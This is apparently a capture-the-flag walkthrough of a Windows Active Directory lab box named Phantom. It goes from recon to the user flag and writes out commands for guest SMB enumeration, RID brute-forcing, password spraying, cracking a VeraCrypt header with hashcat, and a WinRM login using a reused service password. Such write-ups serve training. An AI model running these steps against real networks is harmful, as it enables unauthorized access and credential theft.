## Overview

Phantom is a medium-difficulty Windows Active Directory box. The path to user is a pure credential-chaining exercise: anonymous SMB access leaks an onboarding password from an email attachment, a password spray finds the one account still using it, an encrypted VeraCrypt container on a second share cracks open to a router backup full of cleartext secrets, and one of those secrets is reused by a service account that allows remote PowerShell. This post covers recon through the user flag.

Credential-chaining AD box: guest SMB email leak, password spray, and a VeraCrypt container cracked to a VyOS config password reused for WinRM; no CVE, with a slightly contrived crunch-wordlist crack.

## Recon

| Port | Service | Notes |
|------|---------|-------|
| 53/tcp | DNS | Simple DNS Plus |
| 88/tcp | Kerberos | AD authentication |
| 139,445/tcp | SMB | Windows Server 2022 |
| 389,636,3268,3269/tcp | LDAP/GC | Domain: `phantom.vl` |
| 593/tcp | RPC over HTTP | |
| 3389/tcp | RDP | `DC.phantom.vl` |
| 5985/tcp | WinRM | Microsoft HTTPAPI 2.0 |

```bash
nmap -sC -sV 10.129.234.63
```

The host is a domain controller for `phantom.vl` (machine name `DC`). Add it to your hosts file:

```bash
echo "10.129.234.63 phantom.vl DC.phantom.vl DC" | sudo tee -a /etc/hosts
```

## Enumeration

The `guest` account can read SMB shares with no password. The `Public` share holds an internal email.

```bash
nxc smb phantom.vl -u 'guest' -p '' --shares
impacket-smbclient 'PHANTOM/guest@phantom.vl' -no-pass
# use Public ; get tech_support_email.eml
```

The email is a "new welcome email template" with a base64-encoded PDF attachment. Decoding the attachment and opening the PDF reveals the standard onboarding password handed to every new employee:

```
Username: <new employee>
Password: <redacted>
```

Now enumerate domain users by RID and spray that password — only one account never changed it.

```bash
nxc smb phantom.vl -u 'guest' -p '' --rid-brute    # build users.txt
nxc smb phantom.vl -u users.txt -p '<onboarding_pw>' --continue-on-success
# [+] phantom.vl\ibryant:<onboarding_pw>
```

## Foothold

As `ibryant`, the `Departments Share` is now readable. Under `IT\Backup` sits a VeraCrypt container.

```bash
impacket-smbclient 'PHANTOM/ibryant@phantom.vl'
# use Departments Share ; cd IT\Backup ; get IT_BACKUP_201123.hc
```

A VeraCrypt volume's first 512 bytes form a crackable header. The password is weak (company name + year), so a tiny generated wordlist cracks it in seconds:

```bash
dd if=IT_BACKUP_201123.hc of=./hash bs=512 count=1
crunch 12 12 -t 'Phantom202%^' -o wordlist.txt
hashcat -m 13722 -a 0 hash wordlist.txt    # VeraCrypt SHA512 + XTS
```

Mounting the container reveals a VyOS router backup (`vyos_backup.tar.gz`). Its `config.boot` stores an SSTP VPN user's password in cleartext — and that password is reused by the `svc_sspr` service account, which is allowed to use WinRM:

```bash
evil-winrm -i 10.129.234.63 -u svc_sspr -p '<redacted>'
```

```
*Evil-WinRM* PS C:\Users\svc_sspr\Documents> whoami
phantom\svc_sspr
```
